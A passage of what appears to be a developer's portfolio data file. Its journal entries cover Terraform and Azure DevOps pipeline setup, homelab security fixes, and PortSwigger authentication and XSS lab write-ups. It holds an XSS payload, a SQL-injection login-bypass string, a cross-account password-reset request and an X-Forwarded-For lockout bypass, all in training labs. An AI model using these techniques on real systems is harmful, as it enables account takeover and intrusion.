      "Also lost a fix by editing the pipeline YAML in ADO's built-in editor while the same file was open locally. ADO's editor commits straight to main and overwrote the uncommitted local edit; had to redo the fix.",
      'A downloaded artifact and a real source folder sharing a directory name is a classic self-inflicted CI bug. Anything you download and clean up belongs in its own subdirectory, never the checkout root.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ3.webp'],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-1-validate-stage',
    date: '2026-09-17',
    category: 'Secure Azure Landing Zone',
    vulnTypes: ['Secure Azure Landing Zone'],
    milestone: true,
    title: 'Azure DevOps pipeline: Validate stage, installing Terraform',
    workedOn: [
      'Started a new project, secure-azure-landing-zone, with the CI pipeline before writing much Terraform: a Validate stage first, to catch mistakes before they touch real infrastructure',
      'Set up an Azure DevOps org from scratch, separate from the Azure Portal account the resources live in',
      'Installed Terraform on the pipeline agent with a plain curl + unzip script rather than the marketplace TerraformInstaller task',
      'Diagnosed a pipeline that hung on the Install Terraform step: unzip was waiting on an interactive overwrite prompt, and a hosted agent has no stdin to answer it',
      'Fixed that with unzip -o, then hit a second failure: cannot delete old terraform: Is a directory. A stray terraform directory from the failed run was left in the workspace, and unzip can overwrite a file but not a directory',
      'Fixed it by wiping the workspace (rm -rf terraform terraform.zip) at the top of the script, before anything else runs',
      'Caught a YAML formatting mistake: a pasted curl command with a stray line break split into two broken shell commands, since line breaks in a script: | block are command boundaries unless escaped with \\',
      'terraform -version now prints Terraform v1.9.8 cleanly on every run, regardless of the state the agent workspace was left in',
      'Next: terraform fmt -check and terraform init -backend=false',
    ],
    body: [
      'New project: secure-azure-landing-zone, starting with the CI pipeline before writing much Terraform. Setting up the Azure DevOps org was a reminder that Azure Portal (where cloud resources live) and Azure DevOps (where pipelines and repos live) are separate products from the same vendor, connected later through a Service Connection.',
      'For installing Terraform on the agent, chose the plain-script approach - curl the release, unzip it - over the marketplace TerraformInstaller task, so it is visible what actually happens on the agent.',
      'That surfaced three bugs. First, the pipeline hung: unzip was waiting on an interactive overwrite prompt left over from a re-run, and a hosted agent has no stdin to answer it. Fixed with unzip -o.',
      'Second, the next run failed differently: cannot delete old terraform: Is a directory. A previous failed run had left a stray terraform directory in the workspace, and unzip -o can overwrite a file, not a directory. Fixed by adding rm -rf terraform terraform.zip to the top of the script, so a hosted agent reused across retries always starts from a clean slate rather than an assumed one.',
      "Third, a smaller one: the curl command, pasted into the YAML script: | block, picked up a stray line break and split into two broken shell commands. Inside a script: | block, every line break is a command boundary unless continued with a trailing \\.",
      'With all three fixed, terraform -version prints Terraform v1.9.8 on every run, regardless of the state a previous run left the workspace in. Next: terraform fmt -check and terraform init -backend=false.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ1.webp',
      'SecureAzureLandingZone/SALZ2.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Azure DevOps',
      'CI/CD pipeline',
      'Terraform',
      'infrastructure as code',
    ],
  },
  {
    id: 'appsec-homelab-entry-19-terraform-azure-deploy',
    date: '2026-09-17',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    milestone: true,
    title: 'Terraform + Azure: my first real IaC deployment',
    workedOn: [
      'Ran the first Terraform deployment against Azure: terraform plan then terraform apply, standing up a resource group and a storage account in australiaeast',
      'Authenticated through the Azure CLI rather than hardcoding credentials into the Terraform config',
      "Diagnosed a second toolchain issue after yesterday's Homebrew/Rosetta fix: a text editor auto-wrapping .tf files mid-line, breaking Terraform's HCL parser",
      'Confirmed the deployment in the Azure portal and the activity log: the storage account and resource group both created and visible',
      "Next: document the before/after in the repo, then terraform destroy - this was a scoped exercise, not infrastructure I need running long-term",
    ],
    body: [
      'Until now, everything in my AppSec homelab was stood up manually: clone the repo, docker compose up -d --build, done. It works, but the setup only exists in my shell history. Nothing shows what is about to change before it happens, and there is no clean way to tear it down.',
      'This phase called for a real example of Infrastructure as Code alongside the vulnerability work: DevSecOps means finding and fixing bugs, and it also means provisioning infrastructure properly.',
      'Set up Terraform against a free-tier Azure subscription, authenticating through the Azure CLI instead of hardcoding credentials into the config. The build was two resources: a resource group and a storage account inside it, defined in .tf files.',
      'Yesterday\'s Apple-Silicon-vs-Intel-Homebrew issue was sorted, but a second bug turned up: a text editor auto-wrapping the .tf files mid-line, which broke Terraform\'s HCL parser (resource "azurerm_storage_account" and "main" { split across two lines). Infrastructure-as-code is still code, syntax errors included.',
      'With the config clean, terraform plan showed what it was about to create - the resource group, then the storage account with every default and computed attribute - before anything was committed. terraform apply stood both resources up in australiaeast in under two minutes.',
      "The plan/apply split is the difference from Docker Compose, where a command just runs and you see what happens. Here, I got a diff of intended changes before Azure was touched, and a lockfile pinning the provider version so the build is reproducible on another machine.",
      'Confirmed it in the Azure portal and the activity log: stappsechomelab5791 under rg-appsec-homelab in Australia East, with the activity log listing every create and update operation Terraform ran to get there.',
      "Next: document this before/after in the repo, then run terraform destroy. This was a scoped exercise for the portfolio, not infrastructure I need running long-term, so it comes down once it is captured.",
    ],
    screenshots: [
      'Homelab/HomeLabTerraform1.webp',
      'Homelab/HomeLabTerraform2.webp',
    ],
    tools: ['Terraform', 'Azure CLI', 'Azure'],
    tags: [
      'AppSec homelab',
      'Terraform',
      'Azure',
      'DevOps',
      'infrastructure as code',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-18-azure-terraform-setup',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'Setting up Terraform and Azure CLI for the first IaC piece',
    workedOn: [
      'Started Phase 3 of the homelab roadmap: a small Terraform-managed Azure resource, to close the most commonly-flagged skill gap in DevOps job postings',
      "Disabled the GitHub Actions workflow via the repo UI while this phase is in progress, so CI isn't running against a repo that isn't changing",
      "Hit a real environment problem installing Azure CLI: discovered Homebrew was running as an Intel (x86_64) install under Rosetta on what is actually an Apple Silicon Mac, which broke from-source builds of azure-cli's dependencies",
      'Installed native arm64 Homebrew alongside the old one, moved Terraform and Azure CLI onto it, confirmed both with file (real arm64 binaries) rather than trusting a stale build tag in terraform --version',
      'Signed up for an Azure free-tier subscription, authenticated the CLI with az login, confirmed the subscription is active and default',
      'Scaffolded the actual Terraform project: a providers.tf for the azurerm provider, ran terraform init, and fixed a real gitignore mistake before the first commit',
    ],
    body: [
      "Picked Azure over the mini-PC/Docker option for the Terraform piece, since actual DevOps postings mean cloud infrastructure when they say Terraform, not local containers. Storage account is the target: small, free-tier friendly, and simple enough to understand every line rather than copy a template.",
      "Before any of the Terraform work, disabled the GitHub Actions workflow from the repo's Actions tab. No reason to keep the nightly cron and push-triggered scans running against a repo that's about to sit still for a phase that has nothing to do with the app itself.",
      'Installing Azure CLI turned into its own debugging exercise. brew install azure-cli failed compiling one of its dependencies with "C compiler cannot create executables" - looked like a broken toolchain at first, but manual clang test-compiles showed the compiler itself was fine. The real issue: Homebrew was installed at the old Intel-only location (/usr/local) and running via Rosetta on what is actually an Apple Silicon Mac, so its build scripts kept targeting x86_64 with no real x86_64 toolchain behind them. Rosetta itself turned out to be broken too - "Bad CPU type in executable" on Homebrew\'s own bundled Ruby, likely from a Command Line Tools reinstall - and fixing that with softwareupdate --install-rosetta got brew running again but left the original compile failure untouched, confirming the architecture mismatch was the real root cause, not a broken toolchain.',
      "Fixed it properly rather than patching around it: installed native arm64 Homebrew at /opt/homebrew, pointed the shell at it via .zprofile, and reinstalled azure-cli and terraform through that instead. Confirmed with file on the actual binaries that they're real arm64 executables, since terraform --version stubbornly still prints darwin_amd64 - that turned out to be a static build tag from HashiCorp's release process, not a reflection of what's actually running.",
      'Signed up for an Azure free-tier account, authenticated via az login, and confirmed a subscription active and set as default. Then scaffolded the Terraform project itself: providers.tf declaring the azurerm provider, terraform init to pull the provider plugin down. First .gitignore draft ignored .terraform.lock.hcl, which is backwards - that lock file pins the exact provider version for reproducibility and should be committed, only the .terraform/ cache and state files should be ignored. Fixed before the first commit rather than after.',
      "Good reminder from this session: half the actual work in DevOps tooling is the environment underneath the tool, not the tool itself. The Terraform config is three lines so far. Getting to the point where it could even run took working through an architecture mismatch most tutorials never mention, because most people aren't running an Intel Homebrew install on Apple Silicon by accident.",
    ],
    tools: ['Terraform', 'Azure CLI', 'Homebrew'],
    tags: [
      'AppSec homelab',
      'Terraform',
      'Azure',
      'DevOps',
      'infrastructure as code',
      'toolchain debugging',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-17-risk-assessment',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title:
      'A lightweight risk assessment of the homelab, mapped to NIST CSF 2.0',
    workedOn: [
      "Wrote a lightweight risk assessment of the whole homelab environment (mini PC, vulnerable app, CI/CD pipeline, GitHub repo), structured around NIST CSF 2.0's five functions",
      'Listed the actual assets and threats, rated each by likelihood and impact, and mapped the controls already built - SSH hardening, ufw, fail2ban, SAST/secrets/DAST, SHA-pinned Actions - against Identify/Protect/Detect/Respond/Recover',
      'Flagged the real gaps rather than skipping them: no patch cadence on the mini PC, no Recover function in practice, no network segmentation',
    ],
    body: [
      "Stepped back from the hands-on exploit-and-fix work today to write a lightweight risk assessment of the whole homelab: the mini PC, the vulnerable app, the CI/CD pipeline, and the GitHub repo housing it. Structured it around NIST CSF 2.0's five functions - Identify, Protect, Detect, Respond, Recover - since that's the framework most of the AppSec and GRC job specs I'm reading name directly.",
      'The point was not to invent controls to document. Everything under Protect and Detect is stuff already built over the last few weeks - SSH key auth, ufw, fail2ban, Semgrep/gitleaks/ZAP in the pipeline, SHA-pinned Actions - mapped after the fact onto a standard structure instead of left as a loose pile of homelab tasks.',
      'Recover came back mostly empty, and I left it that way rather than padding it out. There is no backup or disaster-recovery process for the mini PC, which is a real gap on paper and a non-issue in practice since there is no production data to lose. Writing that down as a gap felt like the more honest version of the exercise than skipping the section.',
      'This is the part of the job I have not had much reason to practice day to day: taking real technical controls and describing them the way a risk register would, rather than the way an engineer would. Worth doing on purpose rather than meeting it for the first time in an actual GRC role.',
    ],
    tags: ['AppSec homelab', 'risk assessment', 'NIST CSF', 'GRC'],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab/blob/main/homelab-risk-assessment.md',
    },
  },
  {
    id: 'appsec-homelab-entry-16-plaintext-password-fix',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'Cryptographic Failures'],
    milestone: true,
    title: 'Fixing plaintext password storage - the last seeded vulnerability',
    workedOn: [
      'Fixed the last of the four seeded vulnerabilities: plaintext password storage in the User model and SeedData',
      "Renamed the Password column to PasswordHash and switched to Microsoft.AspNetCore.Identity's PasswordHasher<User> for salted PBKDF2 hashing",
      'Rewrote AuthController.cs login to look up by username only, then verify the submitted password against the stored hash in C# instead of comparing plaintext in SQL',
      'Worked through three real compile/runtime errors along the way rather than getting a working version handed to me: statements nested inside an AddRange() call, a missing fallthrough return, and a stale SQLite database that still had the old schema',
      "Re-tested: correct login still works, a wrong password now correctly fails, and the SQLi payload from the login bypass fix still fails - confirming the parameterized query wasn't affected by the password-check rewrite",
    ],
    body: [
      'Last of the four seeded bugs. This one is different in kind from the other three - not an injection flaw with a clever payload, but a cryptographic failure: the User model stored Password as a raw string, and the login query checked it with Password = @Password. A leaked database would have handed over every credential in plain text, and since people reuse passwords, that kind of leak cascades well beyond this one app.',
      "Worked through this one myself rather than having the fix handed to me, which meant hitting the errors instead of skipping past them. First one: renamed the model property to PasswordHash and started building the seed data, but put the hasher setup and hash assignments as loose statements at the top of the file, outside any method - that doesn't compile in a file that also declares a class. Moved it inside SeedData.Initialize(), inside the existing if (!db.Users.Any()) gate, right where the old plaintext User objects were built.",
      'Second error: those same setup lines ended up nested inside the parentheses of db.Users.AddRange(...), as if they were arguments to the call. AddRange takes finished objects, not statements. Pulled the hasher/admin/wiener setup out as their own lines before the call, then AddRange(admin, wiener) just took the two ready objects.',
      'Third one was in AuthController.cs. The old query checked username and password together in one WHERE clause, which cannot work once the password column holds a salted hash - the same password hashes differently every time, so there is no way to compare it with SQL\'s =. Rewrote the query to look up by username only, pulled the stored hash out of the reader, and used PasswordHasher<User>.VerifyHashedPassword to check the submitted password against it in C#. First pass at this still left a dangling @Password parameter bound to a query that no longer referenced it, a missing semicolon and an unbalanced Ok(...) call, and the one that stopped it compiling: no return statement for the case where reader.Read() finds no matching username at all. IActionResult has to return something on every path through the method; added a single return Unauthorized(...) after the if block, covering both "user does not exist" and "user exists but password is wrong" with one line instead of two, which also avoids leaking which case it was.',
      'Once it compiled, the real gotcha was runtime, not code: SQLite Error 1: no such column: PasswordHash. This app creates its schema with EnsureCreated(), not EF migrations, and EnsureCreated only builds the database if the file does not already exist - it will never alter an existing database to match a changed model. The old appseclab.db was still sitting there with the original Password column, so the app kept using it. Deleting it once was not enough either, because SQLite in WAL mode keeps -shm and -wal side files alongside the main database file, and those can carry stale state back in on reconnect. Stopped the backend, deleted appseclab.db, appseclab.db-shm, and appseclab.db-wal together, and restarted - a completely fresh database built from the current model, PasswordHash column included.',
      "Re-tested the same way as the other three fixes: correct credentials (administrator / admin123) log in, a wrong password returns 401, and the SQL injection payload from the login-bypass fix (administrator'-- with any password) still returns invalid credentials - confirming the parameterized query underneath wasn't disturbed by rewriting the password-check logic on top of it. Checked the raw data too: SELECT Username, PasswordHash FROM Users now shows long hashed blobs instead of admin123 and peter in plain text.",
      'All four seeded vulnerabilities are fixed now, each with a before/exploit/fix/re-test story. This is the one I\'m most likely to bring up in an interview, not because the fix itself is exotic, but because of what broke along the way: a structural C# mistake, a missing-return compile error, and an EnsureCreated/WAL-file trap that had nothing to do with the security logic at all. Debugging "why does the fix not seem to be working" turned out to be as much the job as writing the fix in the first place.',
    ],
    codeSnippets: [
      {
        label: 'AuthController.cs - before (plaintext comparison in SQL)',
        code: 'var sql = "SELECT Id, Username FROM Users WHERE Username = @Name AND Password = @Password";\n// ...\nif (reader.Read())\n{\n    return Ok(new { username = reader["Username"].ToString(), message = "Login successful" });\n}\nreturn Unauthorized(new { message = "Invalid credentials" });',
      },
      {
        label:
          'AuthController.cs - after (lookup by username, verify hash in C#)',
        code: 'var sql = "SELECT Id, Username, PasswordHash FROM Users WHERE Username = @Name";\n// ... nameParam bound, no password parameter ...\nif (reader.Read())\n{\n    var storedHash = reader["PasswordHash"].ToString();\n    var hasher = new PasswordHasher<User>();\n    var result = hasher.VerifyHashedPassword(new User(), storedHash, request.Password);\n    if (result == PasswordVerificationResult.Success)\n    {\n        return Ok(new { username = reader["Username"].ToString(), message = "Login successful" });\n    }\n}\nreturn Unauthorized(new { message = "Invalid credentials" });',
      },
      {
        label: 'SeedData.cs - hashing at seed time',
        code: 'var hasher = new PasswordHasher<User>();\nvar admin = new User { Username = "administrator" };\nadmin.PasswordHash = hasher.HashPassword(admin, "admin123");\nvar wiener = new User { Username = "wiener" };\nwiener.PasswordHash = hasher.HashPassword(wiener, "peter");\ndb.Users.AddRange(admin, wiener);',
      },
    ],
    screenshots: [
      'Homelab/HomeLabPasswordFix1.webp',
      'Homelab/HomeLabPasswordFix2.webp',
      'Homelab/HomeLabPasswordFix3.webp',
      'Homelab/HomeLabPasswordFix4.webp',
    ],
    tools: ['.NET / C#', 'ASP.NET Core Identity', 'SQLite', 'curl'],
    tags: [
      'AppSec homelab',
      'cryptographic failures',
      'password hashing',
      'PBKDF2',
      'OWASP Top 10',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-15-readme-audit-xss-reverify',
    date: '2026-09-16',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'XSS'],
    title: 'Auditing the README against the code, and re-proving the XSS fix',
    workedOn: [
      "Checked the homelab README's vulnerability claims against the actual code and found it had gone stale: both seeded SQLi bugs were already fixed (in earlier sessions) but still listed as live exploits, and the reflected XSS claim didn't hold up either - the code was already safe JSX text interpolation, not the raw-HTML render the README described",
      'Reintroduced a genuine XSS (dangerouslySetInnerHTML) to get a clean, current repro instead of relying on an old screenshot',
      "Confirmed the exploit live: <img src=x onerror=alert('XSS')> rendered as a real <img> tag and fired the alert",
      'Reverted to JSX text interpolation and re-tested the identical payload - renders as inert text, no execution',
      "Rewrote the README's vulnerability table and exploit section to match what the code does now",
    ],
    body: [
      "Before starting on anything new, went back through the README with a critical eye, since a couple of the claims in it dated from mid-fixes I'd since finished and never looped back to document. Both AuthController.cs and ProductsController.cs SQLi were already parameterized (Entries 11 and 12), but the README's 'Demonstrated exploits' section still gave working payloads for both, as if they'd still open a way in. Worse than a bug: it's a claim a technical reader could disprove in thirty seconds.",
      "The XSS entry was similar but slightly different - the code was already back to safe {submittedQuery} interpolation, which is correct, but the README had also picked up a fabricated detail along the way: a note claiming the nginx CSP blocks the exploit payload. There was never a live bug for that CSP to be blocking - React escapes JSX text by default regardless of CSP. That line was documenting a fix for a problem that wasn't there.",
      "Rather than just correct the wording from memory, wanted current, provable evidence instead of relying on an old screenshot. Put dangerouslySetInnerHTML back into ProductSearch.tsx, ran the app, and fired <img src=x onerror=alert('XSS')> at the search box. It rendered as a real image element in the DOM (broken-icon and all) and the onerror handler executed - confirmed both visually and in the console.",
      "Reverted the component to plain JSX text interpolation and ran the identical payload again. This time it came back as literal text - You searched for: <img src=x onerror=alert('XSS')> - printed on the page, not parsed. Console showed no script execution on the reload. Same bug class as Entry 13, now re-verified against the current code instead of taken on faith.",
      "Rewrote the README's vulnerability table to carry a Status column (Fixed / Open) and replaced the exploit section with an honest before -> exploit -> fix -> re-test writeup for all three bugs, dropping the incorrect CSP claim entirely. Plaintext password storage in SeedData.cs is the one item still open.",
      'Small lesson worth keeping: a fixed vulnerability is only as credible as the docs describing it. Docs drift from code the moment you stop re-checking them against it - worth treating a README claim about security behaviour the same as a test assertion, something that can go stale and needs re-running, not just written once.',
    ],
    codeSnippets: [
      {
        label:
          'Product search result - before (dangerouslySetInnerHTML, reintroduced for this exercise)',
        code: '<p\n  dangerouslySetInnerHTML={{\n    __html: `You searched for: ${submittedQuery}`,\n  }}\n/>',
      },
      {
        label: 'Product search result - after (JSX text interpolation)',
        code: '<p>You searched for: {submittedQuery}</p>',
      },
    ],
    tools: ['React', 'JSX', 'Chrome DevTools'],
    tags: [
      'AppSec homelab',
      'XSS',
      'reflected XSS',
      'output encoding',
      'documentation',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-14-cicd-pipeline',
    date: '2026-09-11',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    milestone: true,
    title:
      'Building a real CI/CD security pipeline (and chasing a moving IP address)',
    workedOn: [
      'Rebuilt the appsec-homelab GitHub Actions workflow from one Semgrep job into a staged, gated pipeline: secrets, sast, build, dependency-scan, and test running in parallel with needs: encoding the real dependency graph',
      'Hardened the workflow itself: SHA-pinned actions, least-privilege permissions per job, SARIF upload to the Security tab, a concurrency group to cancel stale runs',
      'Added a real deployment gate: build -> deploy-staging -> deploy-prod, with deploy-prod tied to a GitHub production Environment that requires a human reviewer to approve before anything ships',
      "Chased a connection-refused error through firewall rules, fail2ban, and iptables before finding the actual cause: the mini PC's Wi-Fi adapter has no fixed IP and DHCP had re-leased a different address",
      'Added dependency scanning (dotnet list package --vulnerable, npm audit) with Dependabot on both ecosystems and on the pinned GitHub Actions, Trivy container scanning left report-only pending a baseline, and DAST run over the same SSH connection as the deploy since the mini PC is LAN-only',
      "Added a nightly cron run, a summary job that reads every other job's result into one pass/fail table, and a Mermaid pipeline diagram in the README",
    ],
    body: [
      'Went into this session wanting one thing to stop being a soft spot in interviews: a true, specific answer to "have you worked with a deployment gate" instead of a textbook one. AppSec Homelab already had a vulnerable app and a single-job Semgrep scan. The goal was to turn that one script into something that actually behaves like a CI/CD security pipeline - staged, gated, and evidenced.',
      'Where it started: security.yml was one job - pull the Semgrep container, run semgrep ci, done. Fine for "I ran a scanner once", not enough for "I built a pipeline".',
      "Phase 1 was structure before scope. Split the single job into named, parallel ones: secrets (gitleaks), sast (Semgrep), build, dependency-scan, test. Independent jobs run concurrently now instead of accidentally serially, and needs: encodes the actual dependency graph - test can't run until build succeeds.",
      'Alongside that: SHA-pinned actions, since a mutable tag like actions/checkout@v4 could have its target moved if the maintainer\'s account were ever compromised, running malicious code with my secrets in scope on the next push - pinning to a commit SHA makes that impossible, paired with Dependabot\'s github-actions ecosystem (added in Phase 3) so the pins still get updated, just via a reviewed PR instead of silently. Least-privilege permissions: read-only at the workflow level by default, with only the sast job elevated to security-events: write because it needs to upload SARIF - the same principle as scoping an IAM role, so a compromised step\'s blast radius is "can read the repo", not "can push to main". SARIF upload to the Security tab so Semgrep findings show up as first-class, dismissible findings instead of buried log output. A concurrency group so a second push cancels a stale run in flight.',
      "Phase 2 was the part I actually wanted: build -> deploy-staging -> deploy-prod, with deploy-prod tied to a GitHub production Environment that has a required-reviewer protection rule. When the pipeline reaches that job it pauses - nothing ships to production until a human clicks approve in the UI. That pause is the deployment gate, the same mechanism Azure DevOps release pipelines are built around, just GitHub's version of it, and now I have a working one I can screenshot rather than describe in the abstract. deploy-staging SSHes into the mini PC and runs docker compose up -d --build, reusing the infrastructure already built for the DAST target rather than standing up a second environment from scratch.",
      "Getting the SSH key wired up ate the most time, and the reason was a good lesson on its own. The mini PC's Wi-Fi adapter doesn't have a fixed IP, and DHCP was re-leasing a different address between the moment I checked sshd status and the moment I tried to connect. Chased \"connection refused\" through firewall rules, fail2ban ban lists, and iptables tables that were all completely correct, because the real problem was one layer up - I was connecting to an address the machine wasn't on anymore. The fix was dumb in hindsight: ip addr show on the target, twice, a few minutes apart, showed two different IPs. Stopped trusting the IP written down in DEPLOY.md, re-checked it live, and the SSH connection worked first try with no firewall or fail2ban change needed.",
      "The proper fix is a DHCP reservation on the router so the mini PC always gets the same lease. I don't have router admin access right now, so that's parked as a known gap with a documented workaround (a static IP set with nmcli on the host itself) rather than something forced through. Worth keeping as a general debugging habit: when every layer you check comes back clean, check whether you're even checking the right target.",
      'Secrets went into the staging GitHub Environment specifically, not the repo-wide secrets store - environment-scoped secrets are only visible to jobs that declare environment: staging, so the production approval gate actually protects something. A repo-level secret would be visible to deploy-prod regardless of whether anyone approved it, which defeats the point of having the gate at all.',
      "Phase 3 added depth. Dependency scanning: dotnet list package --vulnerable --include-transitive for NuGet, npm audit --audit-level=high for the frontend, plus Dependabot enabled on both ecosystems and on the pinned GitHub Actions, so vulnerable dependencies surface as PRs instead of silent drift. Container scanning with Trivy builds both Docker images fresh and scans the filesystem inside each - OS packages and dependencies baked into the final layer, which source-level SAST and SCA structurally cannot see. Left it report-only (exit-code: 0) deliberately: I don't yet know this repo's baseline, and failing the build on an unreviewed first run would just block every deploy on noise. Triage first, tighten the gate second.",
      "DAST had an interesting constraint: the mini PC is LAN-only by design, never exposed to the internet, so a GitHub-hosted runner physically can't reach it. Rather than standing up a self-hosted runner, ran ZAP through the same SSH connection used for the deploy, so the scan executes on the LAN side where the target is actually reachable, then SCP the HTML report back and attach it to the workflow run as a downloadable artifact. Good enough for now - a self-hosted runner on the mini PC is the more correct long-term answer if DAST needs to become its own independent job.",
      "Phase 4 was making results visible without digging through logs. A nightly cron run, because dependency advisories update daily and a package clean yesterday can have a new CVE today with zero code changes on my end. A summary job with if: always() that reads every other job's result via needs.* and writes a pass/fail table to the run's $GITHUB_STEP_SUMMARY, so the pipeline's outcome is one glance instead of eight job logs. A Mermaid pipeline diagram in the README, which GitHub renders natively with no image asset needed, showing the parallel gates feeding staging, DAST folded into that stage, and the required-reviewer pause before production.",
    ],
    screenshot: 'Homelab/HomeLabCICD1.webp',
    tools: [
      'GitHub Actions',
      'Semgrep',
      'gitleaks',
      'Trivy',
      'OWASP ZAP',
      'Dependabot',
      'Docker Compose',
      'SSH',
    ],
    tags: [
      'AppSec homelab',
      'CI/CD pipeline',
      'deployment gate',
      'SCA',
      'container scanning',
      'DAST',
      'least privilege',
      'SHA pinning',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'portswigger-auth-labs-1-5',
    date: '2026-09-08',
    category: 'PortSwigger Labs',
    vulnTypes: ['Authentication'],
    title:
      'Authentication labs 1-5 (username enumeration, 2FA bypass, password reset logic)',
    workedOn: [
      'Started the PortSwigger Authentication path, Labs 1 to 5',
      'Labs 1, 4, 5: username enumeration - by response text, by a subtly different error message, and by response timing',
      'Lab 2: 2FA bypass by navigating straight to the post-login page',
      'Lab 3: password reset with a token that does not change, reused against another account',
    ],
    body: [
      'New topic after finishing XSS. Authentication labs are less about payload craft and more about logic flaws and Burp Intruder workflow: enumerate usernames, then passwords, off small differences in the responses.',
      'Intruder came up in almost every lab here. Lab 1 I fumbled the setup - pasted the whole username=root string into the payload position instead of just the value, so the parameter never varied. Marked the insertion point properly and the wordlist ran fine after that.',
      'Lab 5 was the longest. Timing-based enumeration needs enough samples per request to see the signal over the noise, and then there is a second step: the account lockout. Got past it by adding an X-Forwarded-For header with a junk value so each attempt looked like it came from a new IP.',
    ],
    labs: [
      {
        title: 'Lab 1: Username enumeration via different responses',
        notes: [
          'Logged in with a bad username, intercepted the request in Burp, sent it to Intruder as a Sniper attack over the lab username list.',
          'First run did nothing useful - I had pasted username=root into the payload marker instead of just the value, so the parameter never changed. Fixed the insertion point to wrap only the username value.',
          'Looking for a response that is a different length or status from the rest. albuquerque came back longer, with an "Incorrect password" message instead of "Invalid username", so that is the valid username.',
          'Second Intruder run with albuquerque fixed and the password list as the payload. The right password returns a 302 instead of 200.',
        ],
        solution: 'Username: albuquerque\nPassword: mustang',
        status: 'completed',
        screenshot: 'Burp/Lab1Authentication.webp',
      },
      {
        title: 'Lab 2: 2FA simple bypass',
        notes: [
          'Logged into my own account first and noted the flow: after the login step the app goes to the 2FA code page, then to /my-account.',
          'Logged in as the victim (carlos) with known credentials, got to the 2FA prompt, then changed the URL straight to /my-account.',
          'The app never checks that the 2FA step was actually completed, so it lets you in.',
        ],
        solution:
          'After reaching the 2FA prompt, navigate directly to /my-account.',
        status: 'completed',
        screenshot: 'Burp/Lab2Authentication.webp',
      },
      {
        title: 'Lab 3: Password reset broken logic',
        notes: [
          'Requested a password reset for my own account and watched the flow in Burp. The reset token in the URL does not change between requests.',
          'Requested a reset for carlos, took the reset POST into Repeater, and swapped the username to carlos while keeping a valid token, with a password of my choice.',
          'The reset went through - the token is not tied to the account it was issued for, so a token from any reset request works for any username.',
        ],
        solution:
          'POST to the reset endpoint with temp-forgot-password-token=<any valid token>&username=carlos&new-password-1=test&new-password-2=test',
        status: 'completed',
        screenshot: 'Burp/Lab3Authentication.webp',
      },
      {
        title: 'Lab 4: Username enumeration via subtly different responses',
        notes: [
          'Same idea as Lab 1 but the responses are almost identical. Used the Intruder grep-extract feature to pull the error message out of each response so small differences show in the results table.',
          'One response had a slightly longer warning message than the rest - the kind of thing that is easy to miss without the extract column. That username was valid.',
          'Ran the password list against it to finish.',
        ],
        solution: 'Username: Agenda\nPassword: Access',
        status: 'completed',
        screenshot: 'Burp/Lab4Authentication.webp',
      },
      {
        title: 'Lab 5: Username enumeration via response timing',
        notes: [
          'The app checks the password even for invalid usernames, but a valid username with a very long password takes measurably longer to respond. Sent an over-long password and enumerated usernames by response time.',
          'This needs several requests per username to separate the signal from network jitter, so it was slow on the free version.',
          'After extracting the username and password there was still an account lockout to get past. Intercepted the login, set the stolen username and password, and added X-Forwarded-For: 888 so the request looked like it came from an unblocked IP. Forwarded it, turned off intercept, and the login went through.',
        ],
        solution:
          'Username: vagrant\nPassword: moon\n\nAccount lockout bypassed with an X-Forwarded-For header on the login request.',
        status: 'completed',
        screenshot: 'Burp/Lab5Authentication.webp',
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Burp Repeater', 'Web Browser'],
    tags: [
      'Authentication',
      'username enumeration',
      'Burp Intruder',
      '2FA bypass',
      'password reset',
      'response timing',
      'X-Forwarded-For',
    ],
    link: {
      label: 'Authentication vulnerabilities',
      url: 'https://portswigger.net/web-security/authentication',
    },
  },
  {
    id: 'portswigger-xss-labs-25-30',
    date: '2026-09-07',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    milestone: true,
    title: 'Cross-Site Scripting (XSS) labs 25-30: XSS path complete',
    workedOn: [
      'Finished the XSS path with the expert-level labs, 25 to 30',
      'Labs 25-26: AngularJS sandbox escapes, one straight from the URL and one via the exploit server past a CSP',
      'Labs 27-28: an SVG animate href on a blocked-attribute lab, and a JavaScript URL with characters stripped',
      'Lab 29 (strict CSP + dangling markup): not completed - the target email updates but the lab never marks done, even with the official solution',
      "Lab 30 (CSP bypass): got a script past the CSP by injecting a script-src-elem 'unsafe-inline' directive through a second parameter",
    ],
    body: [
      'Last XSS session. These are labelled expert, but most were quicker than the practitioner filter-evasion labs from the last couple of days - several came down to a single crafted URL.',
      'The AngularJS ones (25 and 26) are sandbox escapes: Angular used to sandbox template expressions, and these labs use the known bypasses for specific versions. Did them as code-alongs, since the payloads are version-specific artefacts rather than something to reason out from scratch.',
